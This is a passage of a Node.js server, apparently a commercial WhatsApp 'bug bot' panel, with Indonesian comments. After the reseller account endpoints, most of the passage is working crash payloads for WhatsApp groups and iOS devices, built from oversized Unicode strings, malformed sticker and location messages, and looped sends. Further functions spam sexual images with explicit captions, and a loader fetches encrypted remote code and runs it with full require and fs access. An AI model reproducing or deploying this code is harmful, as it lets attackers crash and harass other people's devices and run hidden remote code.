  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || requester.role !== "owner") {
    console.log(`[❌ LIST] Bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
}

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM" // Tambahkan parent jika perlu untuk tracking
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // --- HIRARKI ROLE UPDATE (Sesuai Flutter Baru) ---
  const hierarchy = {
    owner: ['moderator', 'partner', 'admin', 'reseller', 'vip', 'member'],
    moderator: ['partner', 'admin', 'reseller', 'vip', 'member'],
    partner: ['admin', 'reseller', 'vip', 'member'],
    admin: ['reseller', 'vip', 'member'] // Admin buat reseller, vip, member
  };

  const creatorRole = creator.role || "member";
  const targetRole = role || "member";

  if (!creator || creator.role !== "owner") {
    console.log("[❌ USERADD] Bukan owner.");
    return res.json({ valid: true, authorized: false, message: "Hanya Owner yang bisa manage akun via Aplikasi." });
}

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  // --- CEK LIMIT BULANAN UPDATE ---
  const roleLimits = {
    owner: 100,
    moderator: 45, // Tambahkan limit Moderator
    partner: 40,   // Tambahkan limit Partner
    admin: 35,
    reseller: 30
  };

  const currentLimit = roleLimits[creatorRole];
  const currentMonth = new Date().toISOString().slice(0, 7); 

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || editor.role !== "owner") {
    console.log("[❌ EDIT] Bukan owner.");
    return res.json({ valid: true, authorized: false, message: "Hanya Owner yang bisa manage akun via Aplikasi." });
}

  // Batas hari untuk Reseller (jika ingin diterapkan juga ke role lain, sesuaikan)
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Validasi Hirarki (Sama seperti delete)
  const roleLevel = {
    owner: 6, moderator: 5, partner: 4, admin: 3, reseller: 2, vip: 1, member: 0
  };
  
  if (roleLevel[editor.role] <= roleLevel[targetUser.role]) {
     return res.json({ valid: true, edited: false, message: "Cannot edit user with equal or higher rank." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  appendLogAsync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function YappingGroup(sock, groupJid) {
  const msg = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/598158642_864391896084426_4630997952681591297_n.enc?ccb=11-4&oh=01_Q5Aa3QHlNTSpRKXxoGo5J-b6-gw7M1pvlGuvoi6yp2pJOjF0ew&oe=695F32D4&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "fY6QRZgi0BMaRIZRQdtWDKg5tXFT+KPGcqpkefkqvGI=",
          fileLength: 999999999,
          seconds: 72050829,
          mediaKey: "Xpj7Tb8UPXDj/RqeDS4QHJBJtyCtXasmP204/v6pXY4=",
          height: 9999,
          width: 9999,
          fileEncSha256: "dUkjp/6OmUdRsARecsHRPHo/TdQ9HfwaJhYrseE07U8=",
          directPath: "/v/t62.7161-24/598158642_864391896084426_4630997952681591297_n.enc?ccb=11-4&oh=01_Q5Aa3QHlNTSpRKXxoGo5J-b6-gw7M1pvlGuvoi6yp2pJOjF0ew&oe=695F32D4&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1765260387,
          caption: "info mokel lek ku",
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            statusSourceType: "MUSIC_STANDALONE",
            // Fitur Mentions All untuk menarik perhatian member grup
            mentionedJid: [groupJid], 
            statusAttributions: [{
              type: "STATUS_MENTION",
              music: {
                authorName: "",
                songId: "1137812656623908",
                title: "ꦾ".repeat(10000), // Karakter berat untuk freeze
                author: "ꦾ".repeat(10000),
                artistAttribution: "https://t.me/xeternalz_info",
                isExplicit: true
              }
            }]
          },
          streamingSidecar: "ifzqbbi6VQrr2qWUVcibCLLD5MublGIUI7VQWllrtSH0Oy9Oom8Fsw==",
          thumbnailDirectPath: "/v/t62.36147-24/597931020_1114136300619238_2132267882477762526_n.enc?ccb=11-4&oh=01_Q5Aa3QE3WwujMWlYXtHm0OsWvWU7G2iNPANw9Cpt64aOcOvNrg&oe=695F14B4&_nc_sid=5e03e0",
          thumbnailSha256: "ewOlFHMaQjWVM2MIHgdLESHC9lTe8wqHoRl5StiLkhM=",
          thumbnailEncSha256: "Vf7tqUV/U7cF064u4mVf9/b78ud+Ds3OS2AUwPOs5xE=",
          annotations: [{
            polygonVertices: [{ x: 0, y: 0 }, { x: 1, y: 0 }, { x: 1, y: 1 }, { x: 0, y: 1 }],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMessage: {
                stanzaId: "AC2FA3391836A5F431C9048A1146D3B5",
                message: {
                  extendedTextMessage: {
                    text: "- # SixEyesXCrashèr ん.? ",
                    previewType: "NONE",
                    inviteLinkGroupTypeV2: "DEFAULT"
                  }
                }
              }
            },
            embeddedAction: true
          }]
        }
      }
    }
  }

  // Pengiriman menggunakan JID Grup (@g.us)
  await sock.relayMessage(groupJid, msg, {
    // Biarkan participant kosong atau gunakan ID Bot sendiri agar tidak crash di sisi pengirim
    useUserDevicesCache: true
  })
  
  console.log(`[🔥] Success Send Yapping Bug to Group: ${groupJid}`)
}


async function blankPACKING(sock, target) {
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "./DICKYsad" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./dikiBukanDep" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "woi",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "maklo",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "./diki" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function spamHentai(sock, target) {
    try {
        // Daftar gambar hentau dari xyanzz!
        const images = [
            'https://uploader.zenzxz.dpdns.org/uploads/1782634643973.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634684081.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634712803.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634790697.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782634885410.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782635384351.jpeg',
            'https://uploader.zenzxz.dpdns.org/uploads/1782635406918.jpeg'
        ];

        // Teks caption
        const caption = `*ENAK GK SIH KALO KITA NGEWE?😩, AKU UDH GATAHAN NAK CIPOK AH AH AH😹💋💦💦*`;

        let randomImage = images[Math.floor(Math.random() * images.length)];

        await sock.sendMessage(target, {
            image: { url: randomImage },
            caption: caption
        });

        console.log(`[✅] 1 gambar terkirim ke ${target}`);
        return true;

    } catch (err) {
        console.log(`[❌] Gagal: ${err.message}`);
        return false;
    }
}

// Contoh penggunaan:
// await spamBokep(sock, '6281234567890-123456@g.us');

async function spamBokep(sock, target) {
    try {
        // Daftar gambar bokep
        const images = [
            'https://files.catbox.moe/1b2wog.jpg',
            'https://files.catbox.moe/fo0757.jpg',
            'https://files.catbox.moe/cxk8p3.jpg',
            'https://files.catbox.moe/q7k5kq.jpg',
            'https://files.catbox.moe/lyd3vf.jpg'
        ];

        // Teks caption
        const caption = `*ENAK GK SIH KALO KITA NGEWE?😩, AKU UDH GATAHAN NAK CIPOK AH AH AH😹💋💦💦*`;

        let randomImage = images[Math.floor(Math.random() * images.length)];

        await sock.sendMessage(target, {
            image: { url: randomImage },
            caption: caption
        });

        console.log(`[✅] 1 gambar terkirim ke ${target}`);
        return true;

    } catch (err) {
        console.log(`[❌] Gagal: ${err.message}`);
        return false;
    }
}

async function BugGroup(sock, target) {
  for (let i = 0; i < 50; i++) {
    const messageContent = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "- # SixEyesXCrashèr ん.? " + "ꦽ".repeat(50000) + "ꦾ".repeat(50000),
                hasMediaAttachment: false,
              },
              body: {
                text: "- # SixEyesXCrashèr ん.? " + "ꦽ".repeat(50000) + "ꦾ".repeat(50000),
              },
              nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson:  + "\u0003",
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: zep + "\u0003",
                    voice_call: "call_galaxy",
                  },
                  {
                    name: "form_message",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "wa_payment_learn_more",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "wa_payment_transaction_details",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "wa_payment_fbpin_reset",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "catalog_message",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "payment_info",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "review_order",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "send_location",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "payments_care_csat",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "view_product",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "payment_settings",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "automated_greeting_message_view_catalog",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "open_webview",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "message_with_link_status",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "payment_status",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "galaxy_costum",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "extensions_message_v2",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "landline_call",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "review_and_pay",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: zep + "\u0003",
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: zep + "\u0003",
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );

    await sock.relayMessage(target, messageContent.message, {
      messageId: messageContent.key.id,
    });
  }
}

async function iosXvLoc(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -Infinity,
            degreesLongitude: Infinity,
            jpegThumbnail: null,
            name: "‼️" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            url: `https://crash-ios.${"𑇂𑆵𑆴𑆿".repeat(15000)}.com/${"𑇂𑆵𑆴𑆿".repeat(15000)}.html/`,
          },
        },
      },
    },
    {}
  );

  for (let i = 0; i < 5; i++) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
  };
  await sleep(1000)
}

async function crashGroup(sock, target) {
  await sock.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+21
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: ""
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
      },
    },
    {
      messageId: ""
    }
  );
  
  await sock.relayMessage(target,
    {
      extendedTextMessage: {
        text: "- # SixEyesXCrashèr ん.? " + "ꦽ".repeat(60000),
        contextInfo: {
          quotedMessage: {
            groupInviteMessage: {
              groupJid: "888-62888@g.us",
              inviteCode: "Xx".repeat(10000),
              inviteExpiration: 999e+999 * Date.now(),
              groupName: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              jpegThumbnail: ""
            }
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
        }
      }
    },
  {});
}

async function bugGroup(sock, groupJid) {
  // Payload killer - 2 in 1: kirim + bug group
  const payload = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(65535),
      publisher: "ꦾ".repeat(65535),
      stickers: Array.from({ length: 9999 }, () => ({ type: 1 })),
      fileLength: "18446744073709551615",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: groupJid,
        participant: sock.user.id,
        groupMentions: Array.from({ length: 9999 }, () => ({
          groupJid: `${Math.floor(Math.random() * 999999)}@g.us`,
          groupSubject: "\u0000".repeat(65535)
        })),
        mentionedJid: Array(9999).fill(groupJid)
      },
      packDescription: "\u0000".repeat(65535),
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "549755813888",
      stickerPackOrigin: "USER_CREATED"
    }
  };

  // Triple send - guaranteed crash
  await Promise.all([
    sock.relayMessage(groupJid, payload, { participant: { jid: groupJid } }),
    sock.relayMessage(groupJid, payload, { participant: { jid: groupJid } }),
    sock.relayMessage(groupJid, payload, { participant: { jid: groupJid } })
  ]);
  
  return { success: true, target: groupJid, bug: "activated" };
}

async function iOSExe(sock, target) {
  const exe = "𑇂𑆵𑆴𑆿".repeat(10000);
  const urlexe = `https://exe.${exe}-${exe}.gov/`;
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessageV2Extension: {
        message: {
          locationMessage: {
            degreesLatitude: 11.2798,
            degreesLongitude: 21.0877,
            name: "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤" + exe,
            jpegThumbnail: "",
            isLive: true,
            merchantUrl: urlexe,
            url: urlexe + " idk ~ raldz ",
            clickToWhatsappCall: true,
            contextInfo: {
              externalAdReply: {
                title:
                  "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤",
                body: exe,
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                sourceUrl: urlexe,
                mediaUrl: urlexe,
                merchantUrl: urlexe,
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              quotedAd: {
                advertiserName: exe,
                mediaType: "VIDEO",
                jpegThumbnail: "",
                caption: exe,
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              statusSourceType: "TEXT",
              statusAttributionType: "RESHARED_FROM_MENTION",
              statusAttributions: [
                {
                  type: "STATUS_MENTION",
                  music: {
                    authorName: "null~nxpection",
                    songId: "1137812656623908",
                    title: "𑇂𑆵𑆴𑆿".repeat(9000),
                    author: "𑇂𑆵𑆴𑆿".repeat(9000),
                    artistAttribution: "https://t.me/sayadurovv",
                    isExplicit: true,
                  },
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  for (let i = 0; i < 60; i++) {
    await sleep(1000);
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
  }
}

async function iosXv(sock, target) {
  await sock.relayMessage(
    target,
    {
      requestPhoneNumberMessage: {
        skipType: 7,
        contextInfo: {
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            body: "𑇂𑆵𑆴𑆿".repeat(15000),
            mediaType: "DOCUMENT",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
            sourceUrl: `https://${"𑇂𑆵𑆴𑆿".repeat(15000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior-iOS),,〽️/`,
          },
          quotedMessage: {
            conversation: "#Vault•¿🎭?•(Superior-iOS)" 
                          + "𑇂𑆵𑆴𑆿".repeat(15000)
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentionedJid: ["0@s.whastapp.net"],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "666-666@g.us",
            serverMessageId: 1,
            newsletterName: "؂ن؃؄ٽ؂ن؃",
            contentType: "UPDATE",
          },
        },
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function blankIphone13(sock, target) {
    const randomLatitude = (Math.random() * 180 - 90).toFixed(6);
    const randomLongitude = (Math.random() * 360 - 180).toFixed(6);

    const locationMessage = {
        location: {
            degreesLatitude: Number(randomLatitude),
            degreesLongitude: Number(randomLongitude),
            name: "",
            address: ""
        },
        caption: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000),
        buttons: [
            {
                buttonId: "x",
                buttonText: { displayText: "𑇂𑆵𑆴𑆿".repeat(50000) },
                type: 1
            }
        ],
        headerType: 6,
        requestPaymentMessage: {
            currencyCodeIso4217: "IDR",
            amount1000: 1,
            requestFrom: target,
            noteMessage: {
                extendedTextMessage: {
                    text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000)
                }
            }
        },
        contextInfo: {
            mentionedJid: [target],
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                title: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" + "𑇂𑆵𑆴𑆿".repeat(100000),
